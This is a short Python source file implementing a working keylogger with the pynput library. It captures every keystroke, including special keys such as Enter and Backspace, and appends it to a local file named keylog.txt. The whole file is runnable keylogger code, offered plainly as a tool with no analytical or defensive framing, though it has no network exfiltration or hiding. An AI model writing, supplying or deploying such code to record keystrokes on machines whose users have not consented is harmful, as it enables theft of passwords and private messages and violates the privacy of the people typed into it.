import os
from pynput import keyboard

# Set the log file path
log_file_path = os.path.expanduser("keylog.txt")

def write_to_file(key):
    try:
        with open(log_file_path, "a") as log_file:
            if hasattr(key, "char") and key.char is not None:
                log_file.write(key.char)
            elif key == keyboard.Key.space:
                log_file.write(" ")
            elif key == keyboard.Key.enter:
                log_file.write("\n")
            elif key == keyboard.Key.backspace:
                log_file.write("[BACKSPACE]")
            else:
                log_file.write(f"[{key.name}]")
    except Exception as e:
        print(f"Error logging key: {e}")

def on_press(key):
    write_to_file(key)

def main():
    print(f"Keylogger running... Saving logs to {log_file_path}")
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
